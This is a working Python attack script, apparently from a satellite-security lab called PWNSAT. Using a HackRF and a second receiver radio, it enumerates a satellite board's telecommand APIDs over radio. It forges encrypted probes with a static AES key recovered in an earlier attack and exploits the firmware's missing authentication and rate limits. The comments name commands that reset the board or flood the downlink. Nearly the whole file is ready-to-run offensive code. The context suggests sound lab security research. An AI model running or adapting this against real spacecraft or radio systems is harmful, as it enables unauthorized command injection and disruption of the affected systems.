#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 00_recon_apid_enum_rf.py -- black-box APID enumeration over radio.
#
# For each candidate APID, transmit an encrypted probe telecommand (garbage
# payload, the static AES key recovered via attack 01 -- no MAC to stop it)
# via HackRF while a second radio listens on the downlink. The firmware
# always replies to a structurally valid packet, even for unknown APIDs
# (ERROR TM, APID 0x009), so every probe gets classified:
#   - TM APID != 0x009  -> a real, implemented command
#   - TM APID == 0x009  -> valid range, this value not implemented
#   - nothing decoded   -> RF noise (retry) or the board stopped responding
#
# SAFETY: the sweep doesn't know which APIDs are dangerous. APID 0x02
# (RESETC) resets the board on any payload; 0x05 (SET_BEACON_RATE) with a
# zero first byte floods the downlink. The 4-byte non-zero PROBE_PAYLOAD
# avoids the beacon flood and the attack-02 underflow, but RESETC always
# fires -- use --skip 2 to avoid it, or --start/--end to narrow the range.
#
# Needs a second dedicated RX radio (a single HackRF can't switch TX/RX fast
# enough to catch the ~11ms reply): --rx-device catsniffer (CatSniffer v2)
# or rtlsdr (default, borrows PWNSAT-C3's RTL-SDR -- stop C3 first).
#
# Usage:
#   ./00_recon_apid_enum.py --start 0 --end 0x14
#   ./00_recon_apid_enum.py --skip 2 6   # skip RESETC and BROADCAST_MSG

import argparse
import sys
import time
from pathlib import Path

# Line-buffer so progress prints aren't stuck behind subprocess output.
sys.stdout.reconfigure(line_buffering=True)

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from pwnsat_packets import APIDS, build_tc, decode_packet, encrypt_payload  # noqa: E402

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402
from pwnsat_catsniffer_rx import CatSnifferRX  # noqa: E402
from pwnsat_rtlsdr_rx import RtlSdrRX  # noqa: E402

ERROR_TM_APID = 0x009

# 4 non-zero bytes: avoids BROADCAST_MSG's 0-byte underflow (attack 02) and
# SET_BEACON_RATE's 0ms-interval flood. Garbage content is fine -- this only
# cares whether the APID is recognized, not whether the command succeeds.
PROBE_PAYLOAD = bytes([0x01, 0x01, 0x01, 0x01])


def _probe_apid_once(apid: int, *, seq: int, tx_gain: int, listen_s: float,
                     verbose: bool, cat, min_snr: float) -> list[dict]:
    payload = encrypt_payload(PROBE_PAYLOAD)
    raw_spp = build_tc(apid, payload, seq)

    t0 = time.time()
    transmit_packet(raw_spp, frequency=UPLINK_FREQ_HZ, device_args="hackrf",
                    tx_gain=tx_gain, verbose=verbose)
    time.sleep(listen_s)
    frames = cat.take_since(t0)
    if not frames:
        return []

    # The firmware replies to a TC's APID with the same numeric APID on the
    # TM side, so an APID match is the strongest signal a frame is this
    # probe's reply and not a periodic beacon.
    results = []
    for frame in frames:
        # snr_db only exists on CatSnifferRX frames; inert on RtlSdrRX.
        snr = getattr(frame, "snr_db", None)
        if snr is not None and snr < min_snr:
            # Almost always our own uplink leaking into the RX (918 vs 916MHz).
            if verbose:
                print(f"    (ignoring weak/garbled frame, SNR={snr:.1f}dB "
                      f"-- likely our own TX leaking into the RX, not a real reply)")
            continue
        try:
            pkt = decode_packet(frame.raw)
        except ValueError as exc:
            print(f"    -> got {len(frame.raw)} bytes, couldn't parse as SPP: {exc}")
            continue

        if pkt.packet_type == 1:
            # A TC, not a TM -- the FlatSat never replies with a TC, so this
            # is our own probe leaking into the RX. packet_type catches it
            # even when APID matches, and is the only filter on RtlSdrRX.
            if verbose:
                snr_txt = f"SNR={snr:.1f}dB" if snr is not None else "no SNR reported"
                print(f"    (ignoring TC-type frame, {snr_txt} -- our own probe "
                      f"leaking into the RX, the FlatSat never replies with a TC)")
            continue

        if pkt.apid == apid:
            tag, classification = "REAL RESPONSE (matches probed APID)", "real"
        elif pkt.apid == ERROR_TM_APID:
            tag, classification = "unknown (ERROR TM)", "error"
        else:
            tag, classification = "unrelated traffic (different APID -- background beacon, not this probe)", "unrelated"
        snr_txt = f" SNR={snr:.1f}dB" if snr is not None else ""
        print(f"    -> {tag}: APID 0x{pkt.apid:03X} ({pkt.apid_name}) seq={pkt.sequence_count}{snr_txt}")
        results.append({"probed_apid": apid, "response_apid": pkt.apid,
                        "response_name": pkt.apid_name, "classification": classification})
    return results


def probe_apid(apid: int, *, seq: int, tx_gain: int, listen_s: float,
               verbose: bool, retries: int, cat,
               min_snr: float) -> list[dict]:
    print(f"\n[*] Probing APID 0x{apid:03X} ({APIDS.get(apid, 'not in known list')})...")
    for attempt in range(1, retries + 1):
        if retries > 1:
            print(f"    [attempt {attempt}/{retries}]")
        results = _probe_apid_once(
            apid, seq=seq + attempt - 1, tx_gain=tx_gain, listen_s=listen_s,
            verbose=verbose, cat=cat, min_snr=min_snr,
        )
        if any(r["classification"] in ("real", "error") for r in results):
            return results
        if attempt < retries:
            print(f"    -> no matching response yet (attempt {attempt}/{retries}), "
                  f"retrying (RF noise/packet loss -- not the old TX/RX turnaround "
                  f"race, that's fixed by the CatSniffer now)...")
    print("    -> no response after all retries (RF noise, or the FlatSat "
          "stopped responding entirely; check PWNSAT-C3/serial if this keeps "
          "happening on every APID)")
    return []


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--start", type=lambda x: int(x, 0), default=0x00,
                        help="first APID to probe (default 0x00)")
    parser.add_argument("--end", type=lambda x: int(x, 0), default=0x14,
                        help="last APID to probe, inclusive (default 0x14 -- "
                             "covers every named APID in pwnsat_tools/spp_tools.py)")
    parser.add_argument("--skip", type=lambda x: int(x, 0), nargs="*", default=[],
                        metavar="APID",
                        help="APID(s) to exclude from the sweep, e.g. --skip 2 6 "
                             "to avoid triggering RESETC/the fuzzing crash")
    parser.add_argument("--listen-seconds", type=float, default=0.6,
                        help="how long to wait after each probe before checking "
                             "what the CatSniffer caught (default 0.6s -- replies "
                             "measured around 11-40ms, this is generous margin)")
    parser.add_argument("--retries", type=int, default=2,
                        help="attempts per APID before giving up (default 2) -- "
                             "now only covers genuine RF noise/packet loss, not "
                             "the old TX/RX turnaround race (fixed by the "
                             "CatSniffer, see TWO-RADIO SETUP note in this file's "
                             "header)")
    parser.add_argument("--min-snr", type=float, default=0.0,
                        help="minimum SNR (dB) for a captured frame to be treated "
                             "as a real reply rather than our own TX leaking into "
                             "the CatSniffer's receiver (default 0.0 -- genuine "
                             "replies measured ~12dB, leakage measured ~-1dB)")
    parser.add_argument("--tx-gain", type=int, default=20, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--rx-device", choices=("rtlsdr", "catsniffer"), default="rtlsdr",
                        help="which dedicated radio to use for RX (default rtlsdr, see "
                             "TWO-RADIO SETUP note). rtlsdr borrows PWNSAT-C3's own "
                             "RTL-SDR, so stop C3 first if it's running (they can't "
                             "share the device).")
    parser.add_argument("--catsniffer-port", default=None,
                        help="serial port for the CatSniffer (default: autodetect "
                             "by USB descriptor, see pwnsat_catsniffer_rx.py) -- "
                             "only used with --rx-device catsniffer")
    parser.add_argument("--rx-gain", type=int, default=30,
                        help="RTL-SDR tuner gain, dB -- only used with --rx-device rtlsdr")
    parser.add_argument("--seq", type=int, default=1, help="starting SPP sequence count")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output and the RX "
                             "device's own status messages")
    args = parser.parse_args()

    skip = set(args.skip)
    targets = [a for a in range(args.start, args.end + 1) if a not in skip]

    print("=" * 66)
    print(f"PWNSAT APID enumeration -- probing {len(targets)} APID(s) "
          f"(0x{args.start:02X}-0x{args.end:02X}), skip={sorted(skip)}")
    print("Black-box recon: findings #4 (no rate-limit) + #21")
    print("(unauthenticated recon) + #22 (no TC/TM check) combined.")
    print(f"TX: HackRF (918MHz uplink).  RX: {args.rx_device} (916MHz downlink, "
          "continuous) -- see TWO-RADIO SETUP note in this file's header.")
    print("=" * 66)

    if args.rx_device == "catsniffer":
        cat = CatSnifferRX(port=args.catsniffer_port, verbose=not args.quiet)
    else:
        cat = RtlSdrRX(rf_gain=args.rx_gain, verbose=not args.quiet)
    cat.start()
    time.sleep(0.5)  # let the RX settle before the first probe

    all_results: list[dict] = []
    try:
        for i, apid in enumerate(targets):
            # Each APID reserves `retries` sequence numbers so they don't collide.
            all_results.extend(probe_apid(
                apid, seq=args.seq + i * args.retries, tx_gain=args.tx_gain,
                listen_s=args.listen_seconds, verbose=not args.quiet,
                retries=args.retries, cat=cat, min_snr=args.min_snr,
            ))
    finally:
        cat.close()

    real = {r["probed_apid"]: r["response_name"] for r in all_results
            if r["classification"] == "real"}
    errored = {r["probed_apid"] for r in all_results if r["classification"] == "error"} - set(real)
    silent = set(targets) - set(real) - errored

    print("\n" + "=" * 66)
    print("SUMMARY")
    print("=" * 66)
    if real:
        print("Real, implemented commands found (probed APID -> its own name):")
        for apid, name in sorted(real.items()):
            print(f"  0x{apid:03X}  {name}")
    if errored:
        print("Valid APID range, but not implemented (got ERROR TM back):")
        print("  " + ", ".join(f"0x{a:03X}" for a in sorted(errored)))
    if silent:
        print("No matching response (RF noise -- retry -- or worth a closer look "
              "by hand; may have only caught unrelated background telemetry):")
        print("  " + ", ".join(f"0x{a:03X}" for a in sorted(silent)))
    print(f"\n[*] Sweep complete -- {len(real)} real command(s) out of {len(targets)} probed.")


if __name__ == "__main__":
    main()
